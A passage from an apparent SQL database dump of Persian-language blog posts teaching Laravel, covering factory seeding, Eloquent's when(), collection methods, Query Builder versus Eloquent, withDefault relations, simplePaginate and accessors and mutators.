hljs\">\r\n$factory->define(App\\Contact::class, function (Faker\\Generator $faker) {\r\n    return [\r\n        \'company_id\' => factory(\'App\\ContactCompany\')->create()->id,\r\n        \'first_name\' => $faker->firstName(),\r\n        \'last_name\' => $faker->lastName,\r\n        \'phone1\' => $faker->phoneNumber,\r\n        \'phone2\' => $faker->phoneNumber,\r\n        \'email\' => $faker->email,\r\n        \'skype\' => $faker->word,\r\n        \'address\' => $faker->address,\r\n    ];\r\n});\r\n</code></pre>\r\n \r\n<p>فیلد اول را ببینید، ما از یک factory پدر استفاده کردیم تا یک company بسازیم. خیلی ساده!!!</p><p>در داکیومنت سایت لاراول شما می توانید اطلاعات بیشتری راجع به <a href=\"https://laravel.com/docs/5.5/seeding\">seeding</a> و <a href=\"https://laravel.com/docs/5.5/database-testing#writing-factories\">استفاده از factory با Faker</a> بدست بیاورید.</p>\r\n','1511109440data-seed.jpg',1,'laravel, php, seed','Laravel: Two Ways to Seed Data with Relationships',0,1,69,1,1,1,'2017-10-24 16:29:20','2017-10-24 09:50:46','2017-11-19 13:07:20',NULL),(4,'Eloquent::when(): برای کوئری های مشروط','eloquent-when-برای-کوئری-های-مشروط','<p>برای مدت ها، اکثر ما برنامه نویس ها برای کوئری های مشروط از “if-else” استفاده می کردیم، مثل مثال زیر:</p><pre><code class=\"php hljs\">if (request(\'filter_by\') == \'likes\') {\r\n    $query->where(\'likes\', \'>\', request(\'likes_amount\', 0));\r\n}\r\nif (request(\'filter_by\') == \'date\') {\r\n    $query->orderBy(\'created_at\', request(\'ordering_rule\', \'desc\'));\r\n}\r\n</code></pre>\r\n \r\n<p>حالا من بهتون میگم که راه خیلی بهتری برای انجامش هست. یک راه ساده و لاراولی. متد when() را ببینید.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$query = Author::query();\r\n \r\n$query->when(request(\'filter_by\') == \'likes\', function ($q) {\r\n    return $q->where(\'likes\', \'>\', request(\'likes_amount\', 0));\r\n});\r\n$query->when(request(\'filter_by\') == \'date\', function ($q) {\r\n    return $q->orderBy(\'created_at\', request(\'ordering_rule\', \'desc\'));\r\n});\r\n \r\n$authors = $query->get();\r\n</code></pre>\r\n \r\n<p>خیلی بهتره، نه؟</p><p>صبر کنید که چیزهای بیشتری هم هست.</p><p>در مثال زیر، ما یوزرها رو فقط در هنگامی که یک مورد request ارسال شده باشد، فیلتر می کنیم.</p><p>یعنی، مادامی که هیچ پارامتری نباشد یا اینکه null/false باشد، شما همه یوزرها رو می‌بینید. اما اگر مقداری داشته باشد، مثلا بزارید برای ادمین عدد \"1\" در نظر بگیریم، اون وقت شما فقط یوزرهای ادمین را خواهید دید.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$query = User::query();\r\n \r\n// From Laravel 5.4 you can pass the same condition value as a parameter\r\n$query->when(request(\'role\', false), function ($q, $role) { \r\n    return $q->where(\'role_id\', $role);\r\n});\r\n \r\n$authors = $query->get();\r\n </code></pre>\r\n<p>این فقط یه راه تر و تمیز برای نوشتن if  هستش اما یه روش عالی برای سازماندهی کوئری های مشروط به حساب میاد.</p>\r\n\r\n<p>اطلاعات بیشتر درباره کوئری های مشروط را <a href=\"https://laravel.com/docs/5.5/queries#conditional-clauses\" target=\"_blank\">اینجا</a> بخوانید.</p>','1511109366elowhen.jpg',1,'laravel, php, eloquent','Eloquent::when(): No More if-elses for Conditional Queries',0,1,72,1,1,1,'2017-10-27 00:00:00','2017-10-28 06:56:58','2017-11-19 13:06:06',NULL),(5,'۱۰ تابع کمتر شناخته شده (اما جالب) در collection لاراول','۱۰-تابع-کمتر-شناخته-شده-در-لاراول','<p>Eloquent در لاراول واقعا عالی‌ست، اما شاید این قضیه نیاز به گفتن نداشته باشه واقعا. اما هستن توابعی در Eloquent لاراول که برای کار collectionها استفاده می شوند و کمتر شناخته شده‌اند. به شکلی که شما می‌توانید به راحتی collectionها را فیلتر کنید، تقسیم بندی کنید و یا مدیریت نمایید. پس بهتره که این ۱۰ تابع را بررسی کنیم:</p>\r\n\r\n<p>توجه: Collectionها یک اصطلاح گسترده تر هستند، در حالی که Collection Eloquent، اجرای این Collectionهای گسترده تر است. بنابراین همه چیزهایی را که ما در اینجا قرار می دهیم می توان برای هر دو مورد استفاده کرد.</p>\r\n\r\n<p>خب، برای مثال، شما یک کد لاراول مانند زیر دارید:</p>\r\n\r\n<pre><code class=\"php hljs\">$books = Book::where(\'release_year\', 2015)->get();\r\n</code></pre>در اینجا $books یک collection است که اساسا یک آرایه با ویژگی‌های اضافی است.برای مثال می‌تواند چیزی به شکل زیر باشد:<pre><code class=\"php hljs\">[\r\n    [\'title\' => \'Lean Startup\', \'price\' => 10],\r\n    [\'title\' => \'The One Thing\', \'price\' => 15],\r\n    [\'title\' => \'Laravel: Code Bright\', \'price\' => 20],\r\n    [\'title\' => \'The 4-Hour Work Week\', \'price\' => 5],\r\n]\r\n</code></pre>\r\n\r\n \r\n<p>خب حالا چه کارهایی میشه روش انجام داد؟ نکته مهم این است که تمام توابعی که در پایین معرفی می‌شوند، بدون کوئری به دیتابیس انجام می‌شوند. بنابراین شما می‌توانید یک بار کوئری خودتون رو اجرا کنید و سپس همه عمل‌های collection رو به صورت آفلاین اجرا کنید. </p>\r\n\r\n<h2>1. avg()</h2>\r\n\r\n<p>اگر بخواهید میانگین قیمت کتاب‌ها را محاسبه کنید، نیازی به زدن query جداگانه ندارید و می‌تونید به راحتی به روش زیر میانگین قیمت‌ها رو به روش زیر محاسبه کنید:</p>\r\n\r\n<pre><code class=\"php hljs\">$average_price = $books->avg(\'price\'); // in our case, 12.5\r\n</code></pre>\r\n\r\n<h2>2. chunk()</h2>\r\n\r\n<p>اگر بخواهید نتایج به قسمت های مساوی تقسیم کنید، به طور مثال نتایج را در ستون‌های جداگانه تقسیم کنید، می‌توانید به روش زیر این کار را انجام دهید:</p>\r\n\r\n<pre><code class=\"php hljs\">$chunks = $books->chunk(2);\r\n$chunks->toArray();\r\n</code></pre>\r\n\r\n<p>و نتیجه اینگونه می‌شود:</p>\r\n\r\n<pre><code class=\"php hljs\">[\r\n[\r\n    [\'title\' => \'Lean Startup\', \'price\' => 10],\r\n    [\'title\' => \'The One Thing\', \'price\' => 15]\r\n],\r\n[\r\n    [\'title\' => \'Laravel: Code Bright\', \'price\' => 20],\r\n    [\'title\' => \'The 4-Hour Work Week\', \'price\' => 5],\r\n]\r\n]\r\n</code></pre>\r\n \r\n<h2>3. contains()</h2>\r\n\r\n<p>خیلی ساده - چک می‌کند که collection ما شامل یک مقدار خاص در فیلدهای خود هست یا خیر؟</p>\r\n\r\n<pre><code class=\"php hljs\">$books->contains(\'title\', \'The One Thing\'); // TRUE\r\n$books->contains(\'title\', \'The Second Thing\'); // FALSE\r\n</code></pre>\r\n\r\n<h2>4. every()</h2>\r\n\r\n<p>یک متود دیگر برای تقسیم‌بندی collection به ستون‌های مختلف. منتها با این تفاوت که متود every() یک collection جدید می‌سازد که شامل elementهایی nتایی است. (در اینجا دو تایی)</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$books->every(2); // every 2nd element\r\n</code></pre>\r\n\r\nنتیجه:\r\n\r\n<pre><code class=\"php hljs\">\r\n[\r\n    [\'title\' => \'Lean Startup\', \'price\' => 10],\r\n    [\'title\' => \'Laravel: Code Bright\', \'price\' => 20],\r\n]\r\n</code></pre>\r\n \r\n<h2>5. filter()</h2>\r\n\r\n<p>این متود برای فیلتر کردن نتایج یک collection استفاده می شود:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$expensive_books = $books->filter(function ($book) {\r\n    return $book->price > 10;\r\n});\r\n</code></pre>\r\n\r\n<h2>6. forget()</h2>\r\n\r\n<p>این متود زمانی استفاده می شود که شما بخواهید یکی از ستون‌ها را حذف کنید.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$books->forget(\'price\');\r\n</code></pre>\r\n\r\n<p>نتیجه:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n[\r\n    [\'title\' => \'Lean Startup\'],\r\n    [\'title\' => \'The One Thing\'],\r\n    [\'title\' => \'Laravel: Code Bright\'],\r\n    [\'title\' => \'The 4-Hour Work Week\'],\r\n]\r\n</code></pre>\r\n\r\n<h2>7. implode()</h2>\r\n\r\n<p>کاملا شبیه به تابع آرایه ای implode() خود PHP است. با این تابع می‌توانید یک آرایه را به صورت رشته‌ای به یکدیگر متصل کنید.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$books->implode(\'title\', \', \');\r\n</code></pre>\r\n \r\n<p>نتیجه:</p>\r\n\r\n<pre><code class=\"php hljs\">\'Lean Startup, The One Thing, Laravel: Code Bright, The 4-Hour Work Week\'</code></pre>\r\n \r\n<h2>8. keyBy()</h2>\r\n\r\n<p>این متود، برای استفاده با حلقه foreach بسیار کاربردی است. شما می‌توانید با این متود collection را با استفاده از یک key به یک آرایه تبدیل کنید.</p>\r\n\r\n\r\n<pre><code class=\"php hljs\">$by_key = $books->keyBy(\'title\');\r\n$by_key->all();\r\n</code></pre>\r\n\r\n<p>نتیجه:</p>\r\n\r\n<pre><code class=\"php hljs\">[\r\n    \'Lean Startup\' => [\'title\' => \'Lean Startup\', \'price\' => 10],\r\n    \'The One Thing\' => [\'title\' => \'The One Thing\', \'price\' => 15],\r\n    \'Laravel: Code Bright\' => [\'title\' => \'Laravel: Code Bright\', \'price\' => 20],\r\n    \'The 4-Hour Work Week\' => [\'title\' => \'The 4-Hour Work Week\', \'price\' => 5],\r\n]\r\n</code></pre>\r\n\r\n<h2>9. map()</h2>\r\n\r\n<p>اگر شما می‌خواهید مقادیری از یک collection را برگردونید و روی آنها عملیاتی نیز انجام دهید، می‌توانید از متود map استفاده کنید، بدون اینکه نیازی به foreach داشته باشید.</p><pre><code class=\"php hljs\">$discounted_books = $books->map(function ($item) {\r\n    return [\'title\' => $item->title, \'price\' => $item->price / 2];\r\n});\r\n</code></pre>\r\n \r\n<p>نتیجه:</p>\r\n\r\n<pre><code class=\"php hljs\">[\r\n    [\'title\' => \'Lean Startup\', \'price\' => 5],\r\n    [\'title\' => \'The One Thing\', \'price\' => 7.5],\r\n    [\'title\' => \'Laravel: Code Bright\', \'price\' => 10],\r\n    [\'title\' => \'The 4-Hour Work Week\', \'price\' => 2.5],\r\n]\r\n</code></pre>\r\n\r\n<h2>10. pluck()</h2>\r\n\r\n<p>این متود به شما اجازه می دهد تا فقط یک ستون را به عنوان نتیجه برگردونید.</p>\r\n\r\n<pre><code class=\"php hljs\">$prices = $books->pluck(\'price\');\r\n$plucked->all();\r\n</code></pre>\r\n \r\n<p>نتیجه:</p>\r\n\r\n<pre><code class=\"php hljs\">[10, 15, 20, 5]\r\n</code></pre>\r\n\r\n<p>خب این هم از ۱۰ متود کمتر شناخته شده ای که گفتم در حالی که اینها حتی نصفی از متودهای در دسترس collection لاراول هم نیست. شما می‌توانید لیست کامل آنها را با مثال‌هاشون در <a href=\"http://laravel.com/docs/master/collections#available-methods\">داکیومنت لاراول برای Eloquent Collections و Basic Collections</a> مشاهده کنید.</p>','1511109165collection-methods.jpg',1,'توابع collection, laravel, php','۱۰ تابع کمتر شناخته شده (اما جالب) در collection لاراول',0,1,89,1,1,1,'2017-10-29 17:11:48','2017-10-29 10:13:17','2017-11-19 13:02:45',NULL),(6,'Eloquent ORM و Query Builder در لاراول','eloquent-orm-و-query-builder-در-لاراول','<p>لاراول دو رویکرد را برای کار با دیتابیس به شما پیشنهاد می دهد:</p>\r\n\r\n<p><b>Eloquent ORM:</b> یک ORM بر پایه active record به شما می‌دهد و یک interface با ظرفیت های رابطه ای خودساخته فراهم می کند.</p>\r\n\r\n<p><b>Query Builder:</b> یک رویکرد قابل انعطاف، به علاوه آشنا برای ایجاد کوئری‌های SQL می دهد. و یک رویکرد طبیعی برای ایجاد کوئری های SQL در مورد بخش بزرگی از سازگاری استفاده از SQL مستقیم می دهد.</p>\r\n\r\n<p style=\"direction: rtl;\">بخش زیادی از مقالات و ویدیوهایی که من برای پیشرفت در لاراول خوندم، روی استفاده از Eloquent برای دسترسی به دیتابیس متمرکز شده است. از طرفی، فهمیدم که استفاده از Eloquent برای ساخت JSON حداقل برای برخی تسکها، مانع کنترل من روی چگونگی تنظیم و تولید JSON است. این مقاله نشان می دهد که چگونه من به Query Builder متوسل شدم تا مجموعه های نتایج را به عنوان JSON معرفی کنم.</p>\r\n\r\n<p>همانطور که به مطالعه لاروال ادامه می دهم، خیلی هم مطمئن هستم که مسئولیت هایی که برای Eloquent وجود دارد، بسیار مناسب است. با وجود این، متوجه شدم که وظایفی هم که برای Query Builder بسیار مناسب است، وجود دارد.</p>\r\n\r\n<h2>استفاده از Eloquent ORM</h2>\r\n<p>این هم از کد Eloquent (که انتظار می رود روابط لاراول در آن ساخته شده باشد).</p>\r\n\r\n<pre><code class=\"php hljs\">$tasks = Project::with( [\'category\', \'state\', \'type\'] )->\r\n    where(\'status_id\', \'<>\', 3)->\r\n    orderBy(\'description\')->\r\n    orderBy(\'id\', \'desc\')->get([\'projects.id\',\r\n       \'projects.type_id\',\r\n       \'projects.status_id\',\r\n       \'projects.category_id\',\r\n       \'projects.description\',\r\n       \'projects.start_time\']);\r\nreturn $projects;\r\n</code></pre>\r\n\r\n<p>که JSON زیر را تولید می کند:</p>\r\n\r\n<pre><code class=\"php hljs\">[\r\n    {\r\n        id: \"2\",\r\n        type_id: \"2\",\r\n        status_id: \"1\",\r\n        category_id: \"1\",\r\n        description: \"Dr Fahad Qureshi\",\r\n        start_time: \"2013-08-04 16:00:00\",\r\n        category: {\r\n            id: \"1\",\r\n            text: \"Personal\",\r\n            created_at: \"2013-07-17 04:47:37\",\r\n            updated_at: \"2013-07-17 04:47:37\"\r\n        },\r\n        state: {\r\n            id: \"1\",\r\n            text: \"Open\",\r\n            created_at: \"2013-07-17 04:47:37\",\r\n            updated_at: \"2013-07-17 04:47:37\"\r\n        },\r\n        type: {\r\n            id: \"2\",\r\n            text: \"Appointment\",\r\n            created_at: \"2013-07-17 04:47:37\",\r\n            updated_at: \"2013-07-17 04:47:37\"\r\n        }\r\n    },\r\n    ...\r\n]\r\n</code></pre>\r\n\r\n<p style=\"direction: rtl;\">دیدید که چگونه اطلاعات جداول مرتبط در گره های جداگانه یک JSON قرار گرفت (مانند class، state و nodeها). در این حالت شما هیچ کنترلی روی اینکه چه ستونهایی از این جداول به شما برسد و چه ستونهایی واکشی نگردد، ندارید، مگر اینکه در تعریف مدل خود، آرایه $hidden را تعریف کنید که مشتمل بر ستونهایی است که قرار نیست از دیتابیس بیرون بیایند و این یک حالت کلی است و تاثیرگذاری آن بر روی همه Eloquentهای مدل شما می‌باشد. بنابراین رویکردی مختص برای محدود کردن ستونهایی که از جداول مرتبط می آیند، وجود ندارد. آرایه $hidden نمی‌تواند در زمان اجرا تغییر کند، بنابراین باید در مدل از پیش تعریف شده باشد. پس یا شما نیاز به مدلهایی با تعریف ویژه دارید یا باید بپذیرید که با بخش بزرگی از داده هایی که از جداول مرتبط به شما بازمی‌گردد، زندگی کنید.</p>\r\n\r\n<h2>Query Builderها و یک راه نجات</h2>\r\n<p>با استفاده از Query Builder در لاراول، می‌توانید JSON را به میزان قابل ملاحظه ای با ستونهای کمتر دریافت کنید. query زیر را ببینید:</p>\r\n\r\n<pre><code class=\"php hljs\">$tasks = DB::table(\'projects\')\r\n    ->join(\'projects_categories\', \'projects.category_id\', \'=\', \'projects_categories.id\')\r\n    ->join(\'projects_states\'    , \'projects.status_id\'  , \'=\', \'projects_states.id\')\r\n    ->join(\'projects_types\'     , \'projects.type_id\'    , \'=\', \'projects_types.id\')\r\n    ->orderBy(\'projects.description\')\r\n    ->orderBy(\'projects.id\', \'desc\')\r\n    ->where(\'status_id\', \'<>\', 13)\r\n    ->select(\'projects.id\',\r\n        \'projects.status_id\',\r\n        \'projects.notes\',\r\n        \'projects.start_time\',\r\n        \'projects.end_time\',\r\n        \'projects.labels\',\r\n        \'projects.description\', \r\n        \'projects_categories.text as category\',\r\n        \'projects_states.text as status\',\r\n        \'projects_types.text as type\')\r\n    ->get();\r\n\r\nreturn $tasks;\r\n</code></pre>\r\n<p>JSON زیر تولید می‌شود. Query Builder سطح بالاتری از دسترسی بر روی آنچه در query می‌آید، دارد. برای مثال، توجه داشته باشید که چگونه می‌توانید از \"as\" در متود select() برای نامگذاری مستعار روی یک ستون استفاده کنید.</p>\r\n\r\n<pre><code class=\"php hljs\">[\r\n    {\r\n        id: \"2\",\r\n        status_id: \"1\",\r\n        notes: \"check-up\",\r\n        start_time: \"2013-08-04 16:00:00\",\r\n        end_time: \"2013-08-04 17:00:00\",\r\n        labels: \"\",\r\n        description: \"Dr Schnieder\",\r\n        category: \"Personal\",\r\n        status: \"Open\",\r\n        type: \"Appointment\"\r\n     },\r\n    ...\r\n]\r\n</code></pre>\r\n\r\n<p>گرچه تفاوت های آشکار این دو روش، ممکن برای شما این شبهه را ایجاد کند که کدام روش لزوما بهتر است، با در نظر گرفتن حجم پروژه شاید بتوانید به راحتی تخمین بزنید که از کدام روش استفاده کنید.</p>','1511109272eloque.jpg',1,'laravel, eloquent, php','Eloquent ORM و Query Builder در لاراول',0,0,97,1,1,1,'2017-10-29 17:11:48','2017-10-29 10:13:29','2017-11-19 13:04:32',NULL),(7,'مقدار پیش فرض در روابط BelongsTo','belongsto-default-models-no-need-to-check-in','<p>اخیرا راجع به یک ویژگی در relationship لاراول یافته ام که کلا نحوه کد زدنم را تغییر داده است. برای همین می‌خواهم اون رو به شما بگویم:</p>\r\n\r\n<p>فرض می‌کنیم که یک رابطه در مدل Post داریم:</p>\r\n \r\n<pre><code class=\"php hljs\">\r\npublic function author()\r\n{\r\n    return $this->belongsTo(\'App\\Author\');\r\n}\r\n\r\n</code></pre>\r\n \r\n<p>و در جایی از Blade کدی به صورت زیر داریم:</p>\r\n \r\n<pre><code class=\"php hljs\">\r\n{{ $post->author->name }}\r\n\r\n</code></pre>\r\n \r\n<p>الان اگر مطلب ما نویسنده نداشته باشد، چه می‌شود؟ یعنی اگر posts.author_id خالی باشد. سایت خطای “Trying to get property of non-object” خواهد داد. یعنی برای این مطلب $post->author وجود ندارد که درست باشد.</p>\r\n\r\n<p>و اما من معمولا چگونه این مشکل را حل می‌کردم:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n{{ $post->author->name or \'No author\' }}\r\n\r\n</code></pre>\r\n \r\n<p>و یا شما می‌توانید وجود آنرا چک کنید:</p>\r\n \r\n<pre><code class=\"php hljs\">\r\n@if ($post->author)\r\n  {{ $post->author->name }}\r\n@else\r\n  Do something else\r\n@endif\r\n\r\n</code></pre>\r\n \r\n<p>حالا شاید خوشحال شید که من راه بهتری برای اون بهتون بگم.</p>\r\n\r\n<p>ظاهرا، Eloquent Relationships اجازه می‌دهد که مقدار پیش‌فرض تعریف گردد، در حالت هایی که مدل هیچ مقداری برنمی‌گرداند.</p>\r\n \r\n<pre><code class=\"php hljs\">\r\npublic function author()\r\n{\r\n    return $this->belongsTo(\'App\\Author\')->withDefault();\r\n}\r\n\r\n</code></pre>\r\n \r\n<p>در این مثال، رابطه author() یک مدل خالی از App\\Author را برمی‌گرداند، اگر هیچ author به post وصل نشده باشد.</p>\r\n\r\n<p>همچنین، می‌توانیم یک مقدار پیش‌فرض را در default مدل قرار بدهیم.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\npublic function author()\r\n{\r\n    return $this->belongsTo(\'App\\Author\')->withDefault([\r\n        \'name\' => \'Guest Author\',\r\n    ]);\r\n}\r\n\r\n</code></pre>\r\n \r\n<p>با استفاده از این ساختار، نیازی نیست که دیگر در Blade چیزی را چک کنید، به همین سادگی.</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n{{ $post->author->name }}\r\n\r\n</code></pre>\r\n \r\n<p>کد بالا تنها چیزی است که نیاز است.</p>\r\n\r\n<p><a href=\"https://laravel.com/docs/master/eloquent-relationships#one-to-one\" target=\"_blank\">برای مطالعه بیشتر به بخش Default Models در داکیومنت سایت لاراول مراجعه کنید.</a></p>','1510676796belongTo.jpg',1,'blade, laravel, php, models, hasMany, belongsTo','مقدار پیش فرض در روابط BelongsTo',0,1,56,1,1,1,'2017-11-04 14:09:29','2017-11-04 07:11:59','2017-11-14 12:57:34',NULL),(9,'simplePanigate لاراول، مفیدتر برای دیتاهای بزرگ','simplepanigate-لاراول-مفیدتر-برای-دیتاهای-بزرگ','<p>pagination در لاراول یکی از چیزهایی است که به راحتی می‌توان از آن استفاده کرد، اما برای تعداد زیاد صفحات، می‌تواند روی دیتابیس query اضافه ایجاد کند. اتفاقی که می‌تواند برای دیتاهای بزرگ مشکل ایجاد کند. در حالی که شما می‌توانید از آن دوری کنید.</p><p>یک مثال ساده داریم از جدولی که ۵۰۰۰ مشتری را در خود دارد:</p><pre style=\"line-height: 1.42857;\"><code class=\"php hljs\">$customers = Customer::paginate(10);</code></pre><p>و در فایل Blade شما کد زیر را دارید:</p><pre style=\"line-height: 1.42857;\"><code class=\"php hljs\">\r\n<‌table class=\"table\"‌>\r\n    <‌thead‌>\r\n    <‌tr‌>\r\n        <‌th‌>First name<‌/th‌>\r\n        <‌th‌>Last name<‌/th‌>\r\n        <‌th‌>Email<‌/th‌>\r\n    <‌/tr‌>\r\n    <‌/thead‌>\r\n    <‌tbody‌>\r\n    @foreach ($customers as $customer)\r\n        <‌tr‌>\r\n            <‌td‌>{{ $customer->first_name }}<‌/td‌>\r\n            <‌td‌>{{ $customer->last_name }}<‌/td‌>\r\n            <‌td‌>{{ $customer->email }}<‌/td‌>\r\n        <‌/tr‌>\r\n    @endforeach\r\n    <‌/tbody‌>\r\n<‌/table‌>\r\n\r\n{{ $customers->links() }}\r\n</code></pre><p>در Debugbar مشخص است که queryها چطور عمل می‌کنند.</p><p><img src=\"http://laraveldaily.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-24-at-9.42.02-AM-768x602.png\" alt=\"Laravel pagination\"></p><p>همانطور که می‌بینید یک query برای صفحه اصلی زده می‌شود و یک query دیگر برای شمارش تعداد customers.</p><p>اگر شما نیازی به تعداد صفحات نداشته باشید و تنها بخواهید دکمه‌های Next و Previous را نمایش دهید، آنگاه می‌توانید تابع simplePaginate را فراخوانی کنید.</p><pre style=\"line-height: 1.42857;\"><code class=\"php hljs\">$customers = Customer::simplePaginate(10);</code></pre><p><img src=\"http://laraveldaily.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-24-at-9.43.46-AM-768x560.png\" alt=\"laravel simplepaginate\"></p><p>حالا، تعداد queryها را ببینید.</p>','1510676541simplePaginate.jpg',1,'laravel, paginate','simplePanigate لاراول، مفیدتر برای دیتاهای بزرگ',1,1,100,1,1,1,'2017-11-07 12:56:42','2017-11-07 08:56:59','2017-11-14 12:52:21',NULL),(10,'Accessors و Mutators در لاراول','accessors-و-mutators-در-لاراول','<p>accessorها و mutatorها قابلیت سفارشی دارند، یعنی کاربر می‌تواند با تعریف آنها، خصیصه های Eloquent را تغییر دهد. accessorها زمانی که بخواهیم یک خصیصه را از دیتابیس بگیریم، عمل می‌کند در حالی که mutatorها زمانی فرمت انجام می‌دهند که بخواهیم بر روی دیتابیس ذخیره کنیم.</p>\r\n\r\n<h3>تعریف یک accessor</h3>\r\n\r\n<p>نحوه تعریف یک accessor به شکل <code>()getFooAttribute</code>&nbsp;است به طوری که Foo با حرف بزرگ در اول آن، یک attribute است که می‌خواهیم به آن دسترسی داشته باشیم. اگر attribute شما first_name باشد، و شما با اطمینان بخواهید که هرگاه آن را واکشی کردید، حرف اول آن بزرگ باشد، باید یک accessor به صورت زیر بنویسید:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\npublic function getFirstNameAttribute($value)\r\n{\r\n    return ucfirst($value);\r\n}\r\n</code></pre>\r\n\r\n<p>مطمئنا این یک مثال خیلی عمومی برای مطالعه و درک درست مفهوم accessor است اما می‌توان از آن برای فرمت تاریخ‌ها، قیمت‌ها و غیره استفاده کرد.</p>\r\n\r\n<p>بگذارید فرض کنیم شما یک مدل Member با فیلدهای زیر دارید:</p>\r\n\r\n<ul>\r\n<li>first_name</li>\r\n<li>last_name</li>\r\n<li>email</li>\r\n<li>password</li>\r\n<li>last_visit</li>\r\n<li>settings</li>\r\n<li>created_at</li>\r\n<li>updated_at</li>\r\n</ul>\r\n<p>ما چند فیلد داریم که می‌توانیم برای اونها از مزیت accessorها استفاده کنیم. برای مثال، کاربران اکثرا بی‌دقتی به خرج می‌دهند و شما می‌خواهید اطمینان داشته باشید که نام کوچک و بزرگ هر شخص با حروف بزرگ شروع شود.</p>\r\n\r\n<p>برای ایجاد یک Member از کدی شبیه به این باید استفاده کنید و البته که شما این اطلاعات را از کاربر دریافت خواهید کرد:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$user = App\\Member::create([\r\n    \'first_name\'  =&gt; \'mirza\',\r\n    \'last_name\'   =&gt; \'pasic\',\r\n    \'email\'       =&gt; \'mirza.pasic@bosnadev.com\',\r\n    \'password\'    =&gt; \'!supersecretpassword!\',\r\n    \'last_login\'  =&gt; Carbon\\Carbon::now(),\r\n    \'settings\'    =&gt; [\'two_factor_aut\' =&gt; false, \'session_time\' =&gt; 1200],\r\n    \'created_at\'  =&gt; Carbon\\Carbon::now(),\r\n    \'updated_at\'  =&gt; Carbon\\Carbon::now()\r\n]);\r\n</code></pre>\r\n\r\n<p>ممکن است من یک یوزر بی‌توجه باشم و دقتی به اینکه باید نامم را با حروف بزرگ بنویسم، نداشته باشم، اما شما همچنان می‌خواهید که نام من به درستی در سایت نمایش داده شود، درسته؟ اینجاست که accessorها به کار می‌آیند:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\nuse Illuminate\\Database\\Eloquent\\Model;\r\n\r\n/**\r\n * Class Member\r\n * @package App\r\n */\r\nclass Member extends Model\r\n{\r\n    /**\r\n     * Make sure that first name is always capitalized when retrieved from the database\r\n     * \r\n     * @param $value\r\n     * @return string\r\n     */\r\n    public function getFirstNameAttribute($value)\r\n    {\r\n        return ucfirst($value);\r\n    }\r\n\r\n    /**\r\n     * Make sure that last name is always capitalized when retrieved from the database\r\n     * \r\n     * @param $value\r\n     * @return string\r\n     */\r\n    public function getLastNameAttribute($value)\r\n    {\r\n        return ucfirst($value);\r\n    }\r\n}\r\n</code></pre>\r\n\r\n<p>همچنین شما می‌توانید با استفاده از accessorها دو attribute واقعی را برای ساخت یک attribute جدید استفاده کنیم. در این مثال، به سادگی می‌بینید که من یک attribute به نام full name ساخته‌ام. شما می‌توانید accessor را به صورت زیر بسازید:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n    /**\r\n     * Get members full name\r\n     * \r\n     * @return string\r\n     */\r\n    public function getFullNameAttribute()\r\n    {\r\n        return ucfirst($this-&gt;first_name) . \' \' . ucfirst($this-&gt;last_name);\r\n    }\r\n</code></pre>\r\n\r\n<p>سپس شما به روش زیر می‌توانید از آن استفاده کنید:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$member = App\\Member::find(1);\r\n\r\necho $member-&gt;full_name;\r\n</code></pre>\r\n\r\n<p>شما می‌توانید آن را برای date نیز استفاده کنید. با accessorها شما می‌توانید تعیین کنید که یک date با چه فرمتی نمایش داده شود. در اکثر کشورهای اروپایی نمایش تاریخ متفاوت از کشور آمریکاست. شما می‌توانید با استفاده از accessor این فرمت را نزدیک به کاربران خود نمایش دهید. برای مثال:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n    /**\r\n     * Custom format for the last login date\r\n     * \r\n     * @param $value\r\n     * @return string\r\n     */\r\n    public function getLastLoginAttribute($value)\r\n    {\r\n        return \\Carbon\\Carbon::parse($value)-&gt;format(\'d.m.Y.\');\r\n    }\r\n</code></pre>\r\n\r\n<p>وقتی شما last_login را فراخوانی می‌کنید، خروجی زیر را مشاهده خواهید کرد:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n$member = App\\Member::find(1);\r\necho $member-&gt;last_login;\r\n\r\n// 15.12.2015.\r\n\r\n</code></pre>\r\n\r\n<h3>تعریف یک mutator</h3>\r\n\r\n<p>نحوه تعریف یک Mutator به صورت <code>()setFooAttribute</code>&nbsp;است که Foo فیلدی است که می‌خواهید به آن دسترسی داشته باشید. بنابراین، بزارید فیلدهای first_name  و last_name را پیش از ذخیره شدن در دیتابیس طبق آنچه پیشتر گفتیم، اصلاح کنیم:</p>\r\n\r\n<pre><code class=\"php hljs\">\r\n    /**\r\n     * Make sure that first name is capitalized BEFORE saving it to the database\r\n     * \r\n     * @param $value\r\n     * @return string\r\n     */\r\n    public function setFirstNameAttribute($value)\r\n    {\r\n        $this-&gt;attributes[\'first_name\'] = ucfirst($value);\r\n    }\r\n\r\n    /**\r\n     * Make sure that last name is capitalized BEFORE saving it to the database\r\n     * \r\n     * @param $value\r\n     * @return string\r\n     */\r\n    public function setLastNameAttribute($value)\r\n    {\r\n        $this-&gt;attributes[\'last_name\'] = ucfirst($value);\r\n    }\r\n</code></pre>\r\n\r\n<p>شما ممکن است دقت کرده باشید که ما در اینجا چیزی برنمی‌گردانیم. ما مستقیما به attribute دسترسی داشته و آنرا تنظیم می‌کنیم. با این عملکرد، می‌توانیم مطمئن باشیم که نام و نام خانوادگی کاربران همواره با حروف بزرگ شروع شود.</p>\r\n\r\n<h3>مثال های بیشتر</h3>\r\n\r\n<p>من به شما مثال های خیلی ساده از متودهای accessor و mutator نشان خواهم داد. اما شما می‌توانید بیشتر تست کرده و من شرایط مختلف را هم برای استفاده به شما خواهم گفت.</p>\r\n\r\n<b>هش کردن پسوردها</b><br><p>مطمئنا شما پیش از اینکه رمز عبور را در دیتابیس ثبت کنید، می‌خواهید آنها را هش کنید. Mutatorها یک راه مطمئن برای دست‌یابی به این موضوع 